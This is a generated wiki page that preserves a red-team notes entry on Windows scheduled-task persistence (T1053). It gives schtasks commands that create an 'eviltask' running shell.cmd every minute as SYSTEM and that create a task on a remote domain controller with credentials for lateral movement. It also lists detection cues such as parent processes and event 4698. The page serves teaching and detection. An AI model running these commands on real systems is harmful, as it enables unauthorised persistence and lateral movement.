---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Schtask

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1053-schtask` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1053-schtask.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Creating a new scheduled task that will launch shell.cmd every minute:

## Preserved Body

````markdown
## Execution

Creating a new scheduled task that will launch shell.cmd every minute:
```bash
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
```
## Observations

Note that processes spawned as scheduled tasks have `taskeng.exe` process as their parent:

![](<../../_assets/schtask-ancestry.png>)

Monitoring and inspecting commandline arguments and established network connections by processes can help uncover suspicious activity:

![](<../../_assets/schtasks-created.png>)

![](<../../_assets/schtask-connection.png>)

Also, look for events 4698 indicating new scheduled task creation:

![](<../../_assets/schtasks-created-new-task.png>)

### Lateral Movement

Note that when using schtasks for lateral movement, the processes spawned do not have taskeng.exe as their parent, rather - svchost:
```bash
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s dc-mantvydas /u user /p password
```
![](<../../_assets/schtasks-remote.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/schtask.md)

## Evidence Excerpt

```text
_asset_filenames:
- schtask-ancestry.png
- schtask-connection.png
- schtasks-created-new-task.png
- schtasks-created.png
- schtasks-remote.png
_body: '---
description: ''Code execution, privilege escalation, lateral movement and persitence.''
```
